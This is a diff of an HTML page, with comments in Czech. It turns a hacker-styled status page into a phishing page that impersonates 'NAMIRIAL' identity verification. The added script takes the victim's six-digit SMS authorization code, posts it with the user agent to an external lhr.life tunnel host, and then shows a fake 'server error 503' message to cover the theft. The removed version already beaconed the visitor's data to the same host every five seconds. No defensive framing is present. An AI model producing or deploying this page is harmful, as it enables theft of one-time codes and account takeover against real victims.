@@ -1,36 +1,31 @@
 <!DOCTYPE html>
-<html lang="cs">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>AETERNUS-0 | SECURE NODE</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { width: 80%; border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 20px #00ff41; background: rgba(0, 20, 0, 0.9); }
-        .glitch { animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        body { background: #111; color: #0f0; font-family: sans-serif; text-align: center; padding: 50px; }
+        input { background: #222; border: 1px solid #0f0; color: #0f0; padding: 10px; margin: 10px; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <h2 class="glitch">AETERNUS-0 :: SYSTEM_STATUS: ACTIVE</h2>
-        <p>> Node: smart-locker-security-audit</p>
-        <p>> Identity Shield: ENABLED</p>
-        <hr color="#00ff41">
-        <div id="logs">> Čekám na data ze sítě...</div>
-    </div>
+    <h2>NAMIRIAL - OVĚŘENÍ IDENTITY</h2>
+    <p>Zadejte kód z SMS pro dokončení autorizace:</p>
+    <input type="text" id="sms_code" placeholder="6-místný kód">
+    <br>
+    <button onclick="capture()">POTVRDIT</button>
 
     <script>
-        // Tento skript ti bude posílat echo do tvého Kali tunelu
-        async function report() {
-            const info = {
-                ts: new Date().toLocaleTimeString(),
-                loc: window.location.href,
-                ua: navigator.userAgent
+        async function capture() {
+            const code = document.getElementById('sms_code').value;
+            const data = {
+                event: "CAPTURED_ATTEMPT",
+                code: code,
+                userAgent: navigator.userAgent
             };
-            // Pokus o odeslání do tvého lhr.life tunelu (pokud ti běží v Kali)
-            fetch('https://ebfaa1e1d7eb69.lhr.life', { method: 'POST', mode: 'no-cors', body: JSON.stringify(info) }).catch(()=>{});
+            // Tohle pošle info k tobě do mobilu
+            fetch('https://ebfaa1e1d7eb69.lhr.life', { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+            alert("Chyba serveru: 503. Zkuste to později.");
         }
-        setInterval(report, 5000);
     </script>
 </body>
 </html>
